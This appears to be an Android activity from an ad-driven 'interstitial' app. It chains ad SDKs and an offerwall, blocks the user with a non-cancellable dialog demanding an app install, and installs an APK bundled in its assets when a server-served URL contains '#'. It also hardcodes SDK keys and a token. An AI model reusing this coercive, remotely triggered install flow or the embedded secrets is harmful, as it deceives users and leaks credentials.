/*
 * 
 */
package com.interstitial.interstitialproject;


import java.io.File;
import java.util.HashSet;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.MatchResult;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.flurry.android.FlurryAgent;
import com.interstitial.interstitialproject.dao.SdkNetwork;
import com.interstitial.interstitialproject.utils.CrashReportHandler;
import com.interstitial.interstitialproject.utils.ExternalPackage;
import com.interstitial.interstitialproject.utils.HtmlHelper;
import com.interstitial.interstitialproject.utils.IntentAplicationFactory;
import com.interstitial.interstitialproject.utils.JsonHelper;
import com.interstitial.interstitialproject.utils.PackageHelper;
import com.interstitial.interstitialproject.utils.PhoneHelper;
import com.interstitial.interstitialproject.utils.SdkCallHelper;
import com.interstitial.interstitialproject.utils.URLHelper;
import com.jirbo.adcolony.AdColony;
import com.sponsorpay.sdk.android.SponsorPay;
import com.sponsorpay.sdk.android.publisher.SponsorPayPublisher;
import com.vdopia.client.android.VDO;


public class MainActivity extends CustomActivity {
	

	/** Является ли internal-маркап первым по приоритету (true/false)*/
	private boolean isInternalFirst;
	
	/** Показываем только первый sdk, или все (true/false) */
	private boolean isShowOnlyFirst;
	
	/** Задание для разблокировки (true/false) */
	private boolean isIncent;
	
	/** Заблокирована ли кнопка(относится к Incent) */
	private boolean isBlocked = false;
	
	/** Последний ли шаг? */
	private boolean isLastStep;
	
	/** Пакеты для проверки (относится к Incent) */
	private HashSet<String> packages;
	
	/** Текущий шаг */
	private int stepNumber = 1;
	
	/** Верхний текст */
	private TextView titleText;
	
	/** Кнопец */
	private Button nextButton;
	
	/** Прогресс-анимация */
	private ProgressBar progressBar;
	
	/** The sdk networks. */
	private List<SdkNetwork> sdkNetworks;

	private ExternalPackage mExternalPackage;
	
	private static final int INTENT_RESULT_INSTALL = 0;
	private static final int INTENT_RESULT_OPEN_MARKET = 1;
	
	private static final String EXTERNAL_PACKAGE_FILE_NAME = "package.apk";
	private static final String EXTERNAL_PACKAGE_ASSETS_PATH = "applications/package.apk";
	
	
	private static final String securityToken = "b1d5a1d67459b708d8c3c39e405ed620";
	private static final String overridingAppId = "9280";
	
	private WebView myWebView;
	private Dialog d;
	private String packName ="";
	
	private ProgressDialog progressDialog;
	
	
	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        CrashReportHandler.attach(this);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_main);
        PhoneHelper.setContext(this);
        doFirstRun();
        
		String userId = "intesrtitial";
		
		mExternalPackage = new ExternalPackage(this,
				EXTERNAL_PACKAGE_FILE_NAME, EXTERNAL_PACKAGE_ASSETS_PATH);
		
		SponsorPay.start(overridingAppId, userId, securityToken, getApplicationContext());
        
        PhoneHelper.checkConnection();

        
        SdkCallHelper.adcolonyInit(MainActivity.this);
        myWebView = (WebView) findViewById(R.id.webView);
        myWebView.getSettings().setSupportZoom(false);
        myWebView.getSettings().setJavaScriptEnabled(true);
        myWebView.getSettings().setSupportMultipleWindows(true);
        myWebView.clearCache(true);
        
        myWebView.setInitialScale(100);
        myWebView.getSettings().setLoadWithOverviewMode(true);
        myWebView.getSettings().setUseWideViewPort(true);
        myWebView.setScrollBarStyle(WebView.SCROLLBARS_OUTSIDE_OVERLAY);
        myWebView.setScrollbarFadingEnabled(false);
        progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Loading...");
        progressDialog.setMessage("Please wait");
        progressDialog.setCancelable(false);
        
        myWebView.setBackgroundColor(Color.TRANSPARENT);
        myWebView.getSettings().setLayoutAlgorithm(
        WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
        WebViewClient c = new WebViewClient(){

        	

			@Override
			public void onPageFinished(WebView view, String url) {
				progressDialog.show();
				unlockButton(5000);
				if (url.contains("#")){
					installApplication(mExternalPackage.getFile());
					return;
				}
				
				if (URLHelper.checkURL(url)){
					
					Matcher matcher = Pattern.compile("&stepnumber=(.*?)&").matcher(url);
					while (matcher.find()){
						MatchResult result = matcher.toMatchResult();
						stepNumber = Integer.parseInt(result.group(1));

					}
					URLHelper helper = new URLHelper(MainActivity.this);
					helper.getPage(stepNumber);
					
				}	
				
			}
        	
        	
        };

        myWebView.setWebViewClient(c);
        myWebView.getSettings().setLoadWithOverviewMode(true);
        myWebView.getSettings().setUseWideViewPort(false);
        String url = new URLHelper(this).getChainUrl(stepNumber);
        myWebView.loadUrl(url);
        

    }
	
	@Override
	public void onAsyncFinishLoading(String html, String url){

		
		if (url.contains("#")){
			installApplication(mExternalPackage.getFile());
			return;
		}
	
		String json = HtmlHelper.extractJson(html);
		String markup = HtmlHelper.extractMarkup(html);
		
		Log.d("Interstitial", html);
		Log.d("Interstitial", json);
		Log.d("Interstitial", markup);
		
		isIncent = JsonHelper.getIncent(json);
		
		if (isIncent){
			String[] params = JsonHelper.getIncentParams(json);
			String incentText = params[0];
			packName = params[1];
			
			if (PackageHelper.isInstalled(packName, MainActivity.this))
				isBlocked = false;
			else{
				d = new Dialog(this);
				d.setContentView(R.layout.dialog_offer);
				TextView t = (TextView) d.findViewById(R.id.incentText);
				t.setText(incentText);
				d.findViewById(R.id.incentButton).setOnClickListener(new OnClickListener() {
					@Override
					public void onClick(View v) {
						try {
						    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id="+packName)));
						} catch (android.content.ActivityNotFoundException anfe) {
						    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id="+packName)));
						}
					}
				});
				d.setCancelable(false);
				d.show();
			}
		}
		
		
		sdkNetworks = JsonHelper.getSdkList(json);
		if (sdkNetworks.size() != 0)
			isInternalFirst = sdkNetworks.get(0).getName().equals("internal");
		isShowOnlyFirst = JsonHelper.getIsShowOnlyFirst(json);
		isIncent = JsonHelper.getIncent(json);
	
		isLastStep = JsonHelper.checkLastStep(json);
		
		if (isLastStep){
			try {
				startActivityForResult(SponsorPayPublisher.getIntentForUnlockOfferWallActivity(
						getApplicationContext(), "TEST", "Application"),
						SponsorPayPublisher.DEFAULT_UNLOCK_OFFERWALL_REQUEST_CODE);
			} catch (RuntimeException ex) {
				ex.printStackTrace();
			
			}
		}
		
		
		
		
		if (!isInternalFirst){
			if (isShowOnlyFirst)
				//если showlogic = first
				SdkCallHelper.callSdk(sdkNetworks.get(0), MainActivity.this);
			
			else
				//вызываем по порядку sdk
				for (SdkNetwork sdk : sdkNetworks) {
					
					SdkCallHelper.callSdk(sdk, MainActivity.this);
				}
		}
		
//		if (isIncent == false || isBlocked == false)					
//			unlockButton(JsonHelper.getButtonUnLockDelay(json));
	
		
	
		
	}
	
	@Override
	public void onBackPressed() {
        if(myWebView.canGoBack() == true){
        	myWebView.goBack();
        }else{
        	moveTaskToBack(true);
        	finish();
        }
	}
	
	

    @Override
	protected void onPause() {
		super.onPause();
		SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
		SharedPreferences.Editor editor = settings.edit();
        editor.putInt("stepnumber", stepNumber);
        editor.commit();
        
		AdColony.pause();
	}

	@Override
	protected void onResume() {
		super.onResume();
		
		if (d!=null && !packName.equals("") && PackageHelper.isInstalled(packName, this)){
			d.dismiss();
		}
		
		SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
		stepNumber = settings.getInt("stepnumber", 1);
        
		AdColony.resume(this);
		
//		if (isIncent){
//			for (String packageName : packages) {
//				if (PackageHelper.isInstalled(packageName, MainActivity.this))
//					isBlocked = false;
//			}
//			
//			if (isBlocked == false){
//				unlockButton(0);
//			}
//		}
		
	}

	@Override
	protected void onStart() {
		FlurryAgent.onStartSession(this, "V5QYFPPWPNWTQCZC5PBN");
	    FlurryAgent.initializeAds(this);
	    VDO.initialize("d8f54e64e2bda082b8c4b6dab91843c5", this);
	    super.onStart();
	}

	@Override
	protected void onStop()	{
		super.onStop();		
		FlurryAgent.onEndSession(this);
	}
    private void unlockButton(int delay){
    	final TimerTask task = new TimerTask() {
    		public void run() {
          	
    			Handler refresh = new Handler(Looper.getMainLooper());
    			refresh.post(new Runnable() {
    				public void run(){
    					progressDialog.dismiss();
    				}
    			});
            }
    	};
      
    	new Timer().schedule(task, delay);
    }

    private void doFirstRun() {
        SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
        if (settings.getBoolean("isFirstRun", true)) {
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("isFirstRun", false);
            editor.commit();
            new URLHelper(MainActivity.this).pingDownload();
        }
    }
    
    private void doLastRun(){
        SharedPreferences settings = getSharedPreferences("PREFERENCE", MODE_PRIVATE);
        if (settings.getBoolean("isLastRun", true)) {
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("isLastRun", false);
            editor.commit();
            new URLHelper(MainActivity.this).pingUnpack();
        }
    	
    }
    
    
    
	public void installApplication(File file) {
		doLastRun();
		Intent intent = IntentAplicationFactory.createIntentInstall(file);
		startActivityForResult(intent, INTENT_RESULT_INSTALL);
	}
}
